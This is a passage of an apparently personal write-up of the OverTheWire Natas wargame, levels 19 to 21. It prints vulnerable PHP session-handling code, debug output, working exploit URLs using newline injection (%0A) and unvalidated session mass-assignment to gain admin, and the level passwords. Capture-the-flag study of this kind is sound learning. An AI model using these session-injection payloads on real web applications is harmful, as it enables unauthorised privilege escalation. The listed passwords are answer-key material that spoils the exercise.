+<span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;http://natas.labs.overthewire.org/css/jquery-ui.css&#34;</span> <span class="p">/&gt;</span>
+<span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;http://natas.labs.overthewire.org/css/wechall.css&#34;</span> <span class="p">/&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;http://natas.labs.overthewire.org/js/jquery-ui.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">http://natas.labs.overthewire.org/js/wechall-data.js</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;http://natas.labs.overthewire.org/js/wechall.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="kd">var</span> <span class="nx">wechallinfo</span> <span class="o">=</span> <span class="p">{</span> <span class="s2">&#34;level&#34;</span><span class="o">:</span> <span class="s2">&#34;natas19&#34;</span><span class="p">,</span> <span class="s2">&#34;pass&#34;</span><span class="o">:</span> <span class="s2">&#34;4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs&#34;</span> <span class="p">};&lt;/</span><span class="nt">script</span><span class="p">&gt;&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>natas19<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;content&#34;</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">b</span><span class="p">&gt;</span>
+This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
+<span class="p">&lt;/</span><span class="nt">b</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+DEBUG: Session start ok<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>You are an admin. The credentials for the next level are:<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">pre</span><span class="p">&gt;</span>Username: natas20
+Password: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF<span class="p">&lt;/</span><span class="nt">pre</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">Password: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="natas20">natas20</h2>
+<p>Starting this off by going to: <a href="http://natas20.natas.labs.overthewire.org/">http://natas20.natas.labs.overthewire.org/</a></p>
+<p>Login info is:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">User: natas20
+Pass: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
+</code></pre></td></tr></table>
+</div>
+</div><p>The view source button is back, and this time we seem to be able to change our name. The goal once again is to log in as an admin to get to the next level.</p>
+<p>Starting with the source to the problem:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?</span>
+<span class="k">function</span> <span class="nf">debug</span><span class="p">(</span><span class="nv">$msg</span><span class="p">)</span> <span class="p">{</span> <span class="cm">/* {{{ */</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">array_key_exists</span><span class="p">(</span><span class="s2">&#34;debug&#34;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">print</span> <span class="s2">&#34;DEBUG: </span><span class="si">$msg</span><span class="s2">&lt;br&gt;&#34;</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="cm">/* }}} */</span>
+<span class="k">function</span> <span class="nf">print_credentials</span><span class="p">()</span> <span class="p">{</span> <span class="cm">/* {{{ */</span>
+    <span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION and array_key_exists</span><span class="p">(</span><span class="s2">&#34;admin&#34;</span><span class="p">,</span> <span class="nv">$_SESSION</span><span class="p">)</span> <span class="k">and</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&#34;admin&#34;</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">print</span> <span class="s2">&#34;You are an admin. The credentials for the next level are:&lt;br&gt;&#34;</span><span class="p">;</span>
+    <span class="k">print</span> <span class="s2">&#34;&lt;pre&gt;Username: natas21</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+    <span class="k">print</span> <span class="s2">&#34;Password: &lt;censored&gt;&lt;/pre&gt;&#34;</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="k">print</span> <span class="s2">&#34;You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.&#34;</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="cm">/* }}} */</span>
+
+<span class="cm">/* we don&#39;t need this */</span>
+<span class="k">function</span> <span class="nf">myopen</span><span class="p">(</span><span class="nv">$path</span><span class="p">,</span> <span class="nv">$name</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">//debug(&#34;MYOPEN $path $name&#34;);
+</span><span class="c1"></span>    <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="cm">/* we don&#39;t need this */</span>
+<span class="k">function</span> <span class="nf">myclose</span><span class="p">()</span> <span class="p">{</span>
+    <span class="c1">//debug(&#34;MYCLOSE&#34;);
+</span><span class="c1"></span>    <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="nf">myread</span><span class="p">(</span><span class="nv">$sid</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">debug</span><span class="p">(</span><span class="s2">&#34;MYREAD </span><span class="si">$sid</span><span class="s2">&#34;</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">strspn</span><span class="p">(</span><span class="nv">$sid</span><span class="p">,</span> <span class="s2">&#34;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-&#34;</span><span class="p">)</span> <span class="o">!=</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$sid</span><span class="p">))</span> <span class="p">{</span>
+    <span class="nx">debug</span><span class="p">(</span><span class="s2">&#34;Invalid SID&#34;</span><span class="p">);</span>
+        <span class="k">return</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="nv">$filename </span><span class="o">=</span> <span class="nx">session_save_path</span><span class="p">()</span> <span class="o">.</span> <span class="s2">&#34;/&#34;</span> <span class="o">.</span> <span class="s2">&#34;mysess_&#34;</span> <span class="o">.</span> <span class="nv">$sid</span><span class="p">;</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$filename</span><span class="p">))</span> <span class="p">{</span>
+        <span class="nx">debug</span><span class="p">(</span><span class="s2">&#34;Session file doesn&#39;t exist&#34;</span><span class="p">);</span>
+        <span class="k">return</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="nx">debug</span><span class="p">(</span><span class="s2">&#34;Reading from &#34;</span><span class="o">.</span> <span class="nv">$filename</span><span class="p">);</span>
+    <span class="nv">$data </span><span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
+    <span class="nv">$_SESSION </span><span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+    <span class="k">foreach</span><span class="p">(</span><span class="nx">explode</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nv">$data</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$line</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">debug</span><span class="p">(</span><span class="s2">&#34;Read [</span><span class="si">$line</span><span class="s2">]&#34;</span><span class="p">);</span>
+    <span class="nv">$parts </span><span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s2">&#34; &#34;</span><span class="p">,</span> <span class="nv">$line</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="nv">$parts</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="nv">$parts</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">=</span> <span class="nv">$parts</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nx">session_encode</span><span class="p">();</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="nf">mywrite</span><span class="p">(</span><span class="nv">$sid</span><span class="p">,</span> <span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// $data contains the serialized version of $_SESSION
+</span><span class="c1"></span>    <span class="c1">// but our encoding is better
+</span><span class="c1"></span>    <span class="nx">debug</span><span class="p">(</span><span class="s2">&#34;MYWRITE </span><span class="si">$sid $data</span><span class="s2">&#34;</span><span class="p">);</span>
+    <span class="c1">// make sure the sid is alnum only!!
+</span><span class="c1"></span>    <span class="k">if</span><span class="p">(</span><span class="nx">strspn</span><span class="p">(</span><span class="nv">$sid</span><span class="p">,</span> <span class="s2">&#34;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-&#34;</span><span class="p">)</span> <span class="o">!=</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$sid</span><span class="p">))</span> <span class="p">{</span>
+    <span class="nx">debug</span><span class="p">(</span><span class="s2">&#34;Invalid SID&#34;</span><span class="p">);</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="nv">$filename </span><span class="o">=</span> <span class="nx">session_save_path</span><span class="p">()</span> <span class="o">.</span> <span class="s2">&#34;/&#34;</span> <span class="o">.</span> <span class="s2">&#34;mysess_&#34;</span> <span class="o">.</span> <span class="nv">$sid</span><span class="p">;</span>
+    <span class="nv">$data </span><span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
+    <span class="nx">debug</span><span class="p">(</span><span class="s2">&#34;Saving in &#34;</span><span class="o">.</span> <span class="nv">$filename</span><span class="p">);</span>
+    <span class="nx">ksort</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">);</span>
+    <span class="k">foreach</span><span class="p">(</span><span class="nv">$_SESSION as $key </span><span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">debug</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">$key </span><span class="s2">=&gt; </span><span class="si">$value</span><span class="s2">&#34;</span><span class="p">);</span>
+        <span class="nv">$data </span><span class="o">.=</span> <span class="s2">&#34;</span><span class="si">$key $value\n</span><span class="s2">&#34;</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
+    <span class="nx">chmod</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="mo">0600</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="cm">/* we don&#39;t need this */</span>
+<span class="k">function</span> <span class="nf">mydestroy</span><span class="p">(</span><span class="nv">$sid</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">//debug(&#34;MYDESTROY $sid&#34;);
+</span><span class="c1"></span>    <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="cm">/* we don&#39;t need this */</span>
+<span class="k">function</span> <span class="nf">mygarbage</span><span class="p">(</span><span class="nv">$t</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">//debug(&#34;MYGARBAGE $t&#34;);
+</span><span class="c1"></span>    <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="nx">session_set_save_handler</span><span class="p">(</span>
+    <span class="s2">&#34;myopen&#34;</span><span class="p">,</span>
+    <span class="s2">&#34;myclose&#34;</span><span class="p">,</span>
+    <span class="s2">&#34;myread&#34;</span><span class="p">,</span>
+    <span class="s2">&#34;mywrite&#34;</span><span class="p">,</span>
+    <span class="s2">&#34;mydestroy&#34;</span><span class="p">,</span>
+    <span class="s2">&#34;mygarbage&#34;</span><span class="p">);</span>
+<span class="nx">session_start</span><span class="p">();</span>
+
+<span class="k">if</span><span class="p">(</span><span class="nx">array_key_exists</span><span class="p">(</span><span class="s2">&#34;name&#34;</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">))</span> <span class="p">{</span>
+    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&#34;name&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&#34;name&#34;</span><span class="p">];</span>
+    <span class="nx">debug</span><span class="p">(</span><span class="s2">&#34;Name set to &#34;</span> <span class="o">.</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&#34;name&#34;</span><span class="p">]);</span>
+<span class="p">}</span>
+<span class="nx">print_credentials</span><span class="p">();</span>
+
+<span class="nv">$name </span><span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
+<span class="k">if</span><span class="p">(</span><span class="nx">array_key_exists</span><span class="p">(</span><span class="s2">&#34;name&#34;</span><span class="p">,</span> <span class="nv">$_SESSION</span><span class="p">))</span> <span class="p">{</span>
+    <span class="nv">$name </span><span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&#34;name&#34;</span><span class="p">];</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>The debug exists, so giving that a quick go again with a login of <code>abc</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="n">DEBUG</span><span class="o">:</span> <span class="n">MYREAD</span> <span class="n">s4q08titul4mao373o05p2jml0</span>
+<span class="n">DEBUG</span><span class="o">:</span> <span class="n">Reading</span> <span class="n">from</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">php5</span><span class="o">/</span><span class="n">sessions</span><span class="o">//</span><span class="n">mysess_s4q08titul4mao373o05p2jml0</span>
+<span class="n">DEBUG</span><span class="o">:</span> <span class="n">Read</span> <span class="n">[name</span> <span class="n">abc]</span>
+<span class="n">DEBUG</span><span class="o">:</span> <span class="n">Read</span> <span class="n">[]</span>
+<span class="n">DEBUG</span><span class="o">:</span> <span class="n">Name</span> <span class="n">set</span> <span class="n">to</span> <span class="n">abc1</span>
+<span class="n">You</span> <span class="n">are</span> <span class="n">logged</span> <span class="n">in</span> <span class="n">as</span> <span class="n">a</span> <span class="n">regular</span> <span class="n">user.</span> <span class="n">Login</span> <span class="n">as</span> <span class="n">an</span> <span class="n">admin</span> <span class="n">to</span> <span class="n">retrieve</span> <span class="n">credentials</span> <span class="n">for</span> <span class="n">natas21.</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>And then trying again with a random name:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="n">DEBUG</span><span class="o">:</span> <span class="n">MYREAD</span> <span class="n">l3fsfsetg1t7smqes25nt2h816</span>
+<span class="n">DEBUG</span><span class="o">:</span> <span class="n">Session</span> <span class="n">file</span> <span class="n">doesn</span><span class="s">&#39;</span><span class="err">t exist</span>
+<span class="n">DEBUG</span><span class="o">:</span> <span class="n">Name</span> <span class="n">set</span> <span class="n">to</span> <span class="n">abcaaa</span>
+<span class="n">You</span> <span class="n">are</span> <span class="n">logged</span> <span class="n">in</span> <span class="n">as</span> <span class="n">a</span> <span class="n">regular</span> <span class="n">user.</span> <span class="n">Login</span> <span class="n">as</span> <span class="n">an</span> <span class="n">admin</span> <span class="n">to</span> <span class="n">retrieve</span> <span class="n">credentials</span> <span class="n">for</span> <span class="n">natas21.</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Ultimately the goal here is to get <code>$_SESSION[&quot;admin&quot;] == 1</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php">function print_credentials() { /* {{{ */
+    if($_SESSION and array_key_exists(&#34;admin&#34;, $_SESSION) and $_SESSION[&#34;admin&#34;] == 1) {
+    print &#34;You are an admin. The credentials for the next level are:<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>&#34;;
+    print &#34;<span class="p">&lt;</span><span class="nt">pre</span><span class="p">&gt;</span>Username: natas21\n&#34;;
+    print &#34;Password: <span class="p">&lt;</span><span class="nt">censored</span><span class="p">&gt;&lt;/</span><span class="nt">pre</span><span class="p">&gt;</span>&#34;;
+    } else {
+    print &#34;You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.&#34;;
+    }
+}
+</code></pre></td></tr></table>
+</div>
+</div><p>So there are two scenarios. One when logging in with an existing account and session the name is updated, and the second when logging in with an account that doesn&rsquo;t exist a new session is created.</p>
+<p>Another thing to note is how the <code>myread</code> function works:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php">    function myread($sid) {
+        ...
+        foreach(explode(&#34;\n&#34;, $data) as $line) {
+            debug(&#34;Read [$line]&#34;);
+        $parts = explode(&#34; &#34;, $line, 2);
+        if($parts[0] != &#34;&#34;)
+        $_SESSION[$parts[0]] = $parts[1];
+        }
+        return session_encode();
+    }
+</code></pre></td></tr></table>
+</div>
+</div><p>This function will read in line by line and then store that into <code>$_SESSION</code>. So getting <code>$_SESSION['admin'] = 1</code> to be read in during the line reading seems to be the trick for this level.</p>
+<p>Taking a look at the <code>mywrite</code> function:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php">function mywrite($sid, $data) {
+    …
+    foreach($_SESSION as $key =&gt; $value) {
+        debug(&#34;$key =&gt; $value&#34;);
+        $data .= &#34;$key $value\n&#34;;
+    }
+    file_put_contents($filename, $data);
+    chmod($filename, 0600);
+}
+</code></pre></td></tr></table>
+</div>
+</div><p>It just turns the key and value from the <code>$_SESSION</code> into a line in a file, which is then read line by line and put into the <code>$_SESSION</code>.</p>
+<p>Putting that together, getting the <code>mywrite</code> function to output the following should get the password for the next level:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">name admin
+admin <span class="m">1</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>The following URL should do the trick, which is abusing that the url encoding for a new line is <code>%0A</code> (line feed):</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-html" data-lang="html">http://natas20.natas.labs.overthewire.org/index.php?debug<span class="err">&amp;</span>name=admin%0Aadmin%201
+</code></pre></td></tr></table>
+</div>
+</div><p>And the password:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">    You are an admin. The credentials <span class="k">for</span> the next level are:
+    Username: natas21
+</code></pre></td></tr></table>
+</div>
+</div><p>Password: <code>IFekPyrQXftziDEsUr3x21sYuahypdgJ</code></p>
+<h2 id="natas21">natas21</h2>
+<p>Starting this off by going to: <a href="http://natas21.natas.labs.overthewire.org/">http://natas21.natas.labs.overthewire.org/</a></p>
+<p>Login info is:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">User: natas21
+Pass: IFekPyrQXftziDEsUr3x21sYuahypdgJ
+</code></pre></td></tr></table>
+</div>
+</div><p>It seems that this level is centered around a type of CSS injection. There&rsquo;s an extra link to look over now:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-html" data-lang="html">http://natas21-experimenter.natas.labs.overthewire.org/index.php
+</code></pre></td></tr></table>
+</div>
+</div><p>This page presents 3 CSS tags and the ability to view the source. Looking at the source the interesting bits are here:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php">session_start();
+// if update was submitted, store it
+if(array_key_exists(&#34;submit&#34;, $_REQUEST)) {
+    foreach($_REQUEST as $key =&gt; $val) {
+    $_SESSION[$key] = $val;
+    }
+}
+</code></pre></td></tr></table>
+</div>
+</div><p>The exploit here is simple, there&rsquo;s no validation on the input from the request and all of the CSS values are stored in the <code>$_SESSION</code>. We just need to provide the following in addition to the regular values:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">name admin
+admin <span class="m">1</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>This can be accomplished with the following URL:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="n">http</span><span class="o">://</span><span class="n">natas21</span><span class="o">-</span><span class="n">experimenter.natas.labs.overthewire.org</span><span class="o">/</span><span class="n">index.php</span><span class="o">?</span><span class="n">debug</span><span class="o">&amp;</span><span class="n">name</span><span class="o">=</span><span class="n">admin</span><span class="o">&amp;</span><span class="n">admin</span><span class="o">=</span><span class="m">1</span><span class="o">&amp;</span><span class="n">align</span><span class="o">=</span><span class="n">center</span><span class="o">&amp;</span><span class="n">fontsize</span><span class="o">=</span><span class="m">100</span>%<span class="m">25</span><span class="o">&amp;</span><span class="n">bgcolor</span><span class="o">=</span><span class="n">yellow</span><span class="o">&amp;</span><span class="n">submit</span><span class="o">=</span><span class="n">Update</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>With this newly created <code>PHPSESSID</code> cookie which encodes the admin flag, it can be used on the original site, which then provides the password:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">You are an admin. The credentials <span class="k">for</span> the next level are:
+Username: natas22
+Password: chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="natas22">natas22</h2>
